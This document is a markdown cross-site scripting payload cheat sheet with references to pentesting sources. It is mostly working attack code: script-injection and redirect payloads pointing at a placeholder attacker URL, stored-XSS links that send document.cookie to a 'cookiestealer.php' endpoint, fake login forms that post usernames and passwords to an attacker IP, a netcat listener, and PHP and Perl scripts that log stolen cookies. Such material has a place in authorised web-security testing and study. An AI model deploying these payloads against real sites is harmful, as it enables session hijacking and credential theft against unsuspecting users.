# XSS Payloads List

Search Tag: #helpers

Note: JavaScript and HTML code snippets are case insensitive.

## Prefix

```
'>
">
```

## Javascript Cookie Properties

```
document.cookie
window.origin
document.cookie
```

## Detection

- HTML attributes

TODO: Put encoded html symbol signs

```
<h1>XSS header injection</h1>
<h2>XSS header injection</h2>
<h3>XSS header injection</h3>
```

- Javascript pop up

```
<script>alert(1)</script>
<script>print()</script>
<img src="" onerror=alert(1)>
<svg src="" onerror=alert(1)>
<iframe src="" onerror=alert(1)>
<input autofocus oNFocus="setTimeout(function() {alert(1)}, 5000);"></input><;/style<;/title<;/textarea<;/script>
```

## Attack Vector

### Port Scanning

```
<img src="http://[::]:8000/image.jpg"><img>
```

### HTML Attributes

- A list of payloads to inject links

```
<script>document.location="http[s]://<attacker_URL>/script.js"</script>
<script>window.location="http[s]://<attacker_URL>/script.js"</script>
<script src="http[s]://<attacker_URL>/script.js"></script>
<img src="http[s]://<attacker_URL>/script.js">
<svg src="http[s]://<attacker_URL>/script.js">
<iframe src="http[s]://<attacker_URL>/script.js">
```

### Inject JavaScript code

- XSS DOM object

```
http[s]://<IP>/index.php?<parameter_id>=<script>window.onload=function(){document.getElementsByName('<html_attribute_field>')[0].innerHTML='XSS is easy!';document.getElementById('<html_ID_attribute>').submit();}</script>

http[s]://<IP>/index.php?page=<script>window.onload=function(){document.getElementsByName('comment')[0].innerHTML='XSS is easy!';document.getElementById('post').submit();}</script>
```

- For stored XSS

```
<a href="https://www.google.com/search?q=what+is+xss" onmouseover="window.location='http[s]://<attacker_URL>/cookiestealer.php='+escape(document.cookie)"What is XSS?

<a href="https://www.google.com/search?q=what+is+xss" onmouseover="window.location='http[s]://<attacker_URL>/cookiestealer.php?cookie='+escape(document.cookie)"What is XSS?
```

### Phishing Templates

#### Harvest Cookies

##### Client Side

- Phishing Form

```html
<h3>Login To Proceed</h3>
<form action=http://<attacker_IP>>
	Username:<br><input type="username" name="Username"></br>
	Password:<br><input type="password" name="Password"></br>
<br><input type="submit" value="Logon"></br>

<h3>Login to continue</h3>  
<form action=http://<attacker_IP>>  
 <input type="username" name="username" placeholder="Username">  
 <input type="password" name="password" placeholder="Password">  
 <input type="submit" name="submit" value="Login">  
</form>

<div>
	<h3>Login to continue</h3>
	<input type="text" placeholder="Username">
	<input type="text" placeholder="Password">
	<input type="submit" value="Login">
	<br><br>
</div>

document.write('<h3>Login to continue</h3>  
<form action=http://<attacker_IP>>  
 <input type="username" name="username" placeholder="Username">  
 <input type="password" name="password" placeholder="Password">  
 <input type="submit" name="submit" value="Login">  
</form>');document.getElementById('urlform').remove();
```

- One liners

```html
<h3>Login To Proceed</h3> <form action=http://<attacker_IP>>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>

<h3>Login to continue</h3> <form action=http://<attacker_IP>> <input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login">  
</form>

<div><h3>Login to continue</h3> <input type="text" placeholder="Username"><input type="text" placeholder="Password"><input type="submit" value="Login"><br><br></div>
```

##### Server Side

- Netcat listener

`$ nc -lnvp 80`

- PHP Cookie Stealer

```php
<?php
$cookie = $_GET['cookie'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' . $cookie . "\r\n");
fclose($fp);
?>
```

- Perl Cookie Stealer (TODO: Update this)

```perl
#!/usr/bin/perl

# sudo mv cookie_stealer.pl /var/www/html/
# sudo chown www-data:www-data /var/www/html/cookie_stealer.pl
# sudo chmod 700 /var/www/html/cookie_stealer.pl
# perl -c /var/www/html/cookie_stealer.pl

#Get Current Date
chomp($DATE	= `date`);

#Log Directory
$dir	= "/var/www/logdir";

#Log File
$file	= "$dir/log.txt";

#Print HTML if tested from a browser
print "Content-type: text/html\n\n";

#Open Log File in appended mode
open(LOG,">>$file");

#Collect HTML Post Data
&getDATA;

#Close Log File
close(LOG);

sub getDATA {
        # Put the posted data into variables
        if($ENV{'QUERY_STRING'} ne "") {
                $buffer = $ENV{'QUERY_STRING'};
        }
        elsif($ENV{'CONTENT_LENGTH'} ne "") {
                #Read the input stream using the below line
                read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
        }
        elsif($#ARGV > -1) {
                chomp($buffer = $ARGV[0]);
        }

	#print "buffer: $buffer<BR>\n";


	#Place buffer into the array @pairs, delimited by the ";%20"
	#A ";" plus "%20" equals a ";" and a space	
        @pairs = split(/;%20/, $buffer);

	print "----------------------------------<BR>\n";
	print LOG "----------------------------------\n";

	$HTTP_REFERER = $ENV{'HTTP_REFERER'};
	print "HTTP_REFERER: $HTTP_REFERER<BR>\n";
	print LOG "HTTP_REFERER: $HTTP_REFERER\n";

	#Enumerate through the @pairs array
        foreach $pair (@pairs) {
		#splits each name/value pair on the equal sign delimiter
                ($name, $value) = split(/=/, $pair);

		#translates every "+" sign back to a space
                $value =~ tr/+/ /;

		#substitute every %HH hex pair back to its equivalent ASCII character, using the pack() function
                $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;

		#store the values into a hash called %FORM
                $FORM{$name} = $value;

                print "DATE: $DATE; NAME: $name;VALUE: $value<BR>\n";
                print LOG "DATE: $DATE; NAME: $name; VALUE: $value\n";
        }

	print "----------------------------------<BR>\n";
	print LOG "----------------------------------\n";

}
```

#### ClickJacking

TODO: Fill this info

#### Malvertising

TODO: Fill this info

---
## References

- [PayloadBox: XSS Payload List](https://github.com/payloadbox/xss-payload-list)

- [10 Practical scenarios for XSS attacks](https://pentest-tools.com/blog/xss-attacks-practical-scenarios)

- [Cobalt: A Pentester’s Guide to Cross-Site Scripting (XSS)](https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss)

- [Geeky much: Cross-site Scripting](https://medium.com/secure-you/cross-site-scripting-b64f440ae060)

- [Computer Security Student (CSS): Perl XSS Cookie Stealer](http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson13/logit.pl.TXT)

- [Step 20: Cross-Site Scripting (XSS)](https://medium.com/@joshthedev/step-20-cross-site-scripting-xss-1df10ff7fd12)

- [XSS Phishing for Fun and Credentials!](https://www.doyler.net/security-not-included/xss-phishing)

- [XSS Attack Chain – Reflected XSS -> CSRF -> Stored XSS](https://www.doyler.net/security-not-included/xss-attack-chain)